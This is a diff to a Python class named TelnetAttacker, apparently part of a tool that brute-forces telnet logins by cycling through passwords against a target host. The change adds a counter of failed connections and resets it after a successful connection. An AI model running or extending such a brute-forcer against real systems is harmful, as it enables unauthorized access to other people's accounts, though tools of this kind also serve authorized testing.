@@ -15,9 +15,11 @@ class TelnetAttacker(Attacker):
             result = tn.expect([b"Last login:"], 2)
         except (EOFError, OSError):
             print("[%s] Connection error - %s" % (self.name, self.target.host))
+            self.failed_conns += 1
             return False
         else:
             self.tries += 1
+            self.failed_conns = 0
             if result[0] == -1:
                 print("[%s] Failed attempt against %s - user: %s, password: %s" %
                       (self.name, self.target.host, self.target.login, password))
@@ -37,9 +39,11 @@ class TelnetAttacker(Attacker):
                 tn.open(self.target.host, self.target.port)
             except ConnectionRefusedError:
                 print("[%s] Connection error - %s" % (self.name, self.target.host))
+                self.failed_conns += 1
             except Exception:
                 print("[%s] Unknown exception while connecting to %s" %
                       (self.name, self.target.host))
+                self.failed_conns += 1
             else:
                 while TelnetAttacker.finish is False:
                     if take_new_password:
